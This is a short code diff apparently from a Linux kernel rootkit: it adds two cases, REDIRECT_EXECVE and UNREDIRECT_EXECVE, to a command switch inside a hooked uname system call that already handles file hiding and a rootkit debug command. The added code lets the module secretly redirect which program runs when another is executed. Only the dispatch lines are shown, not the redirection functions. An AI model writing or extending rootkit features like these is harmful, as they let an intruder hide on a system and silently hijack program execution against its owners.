@@ -572,6 +572,13 @@ asmlinkage long new_sys_newuname(struct new_utsname *name)
 	case UNHIDE_FILE:
 		vfs_unhide_filename(args.p_param1, args.param2);
 		break;
+	case REDIRECT_EXECVE:
+		redirect_execve_path(args.p_param1, args.param2,
+				     args.p_param3, args.param4);
+		break;
+	case UNREDIRECT_EXECVE:
+		unredirect_execve_path(args.p_param1, args.param2);
+		break;
 #ifdef DEBUG
 	case DEBUG_RK:
 		debug_rk();
